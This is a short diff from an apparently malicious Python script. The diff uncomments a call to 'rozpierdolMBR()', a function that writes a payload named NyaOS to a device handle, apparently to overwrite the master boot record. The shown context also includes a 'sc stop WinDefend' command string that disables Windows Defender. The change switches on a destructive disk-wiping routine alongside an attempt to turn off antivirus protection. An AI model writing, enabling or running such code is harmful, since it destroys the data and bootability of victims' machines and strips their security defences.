@@ -53,7 +53,7 @@ def rozpierdolMBR():
     WriteFile(hDevice, NyaOS, None)
     CloseHandle(hDevice)
 
-#rozpierdolMBR()
+rozpierdolMBR()
 
 command = "sc stop WinDefend"
 
